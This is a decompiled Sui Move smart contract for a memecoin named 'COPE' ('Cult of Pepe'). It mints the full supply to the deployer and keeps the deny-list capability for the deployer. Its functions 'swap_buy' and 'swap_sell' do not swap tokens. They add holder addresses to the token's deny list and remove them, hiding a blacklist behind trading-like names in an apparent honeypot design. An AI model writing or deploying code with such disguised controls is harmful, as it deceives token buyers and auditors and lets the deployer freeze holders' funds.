module 0x9148c259f3c3490be4de6d1047aa939af722168ea85c95b0d1774154d8265e6e::cope {
    struct COPE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: COPE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<COPE>(arg0, 9, b"COPE", b"Cult of Pepe", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmVqNb6Poi2qdA68YV265vZBfBochrQvVxCwextSxBErGm"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<COPE>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<COPE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<COPE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<COPE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<COPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<COPE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<COPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<COPE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

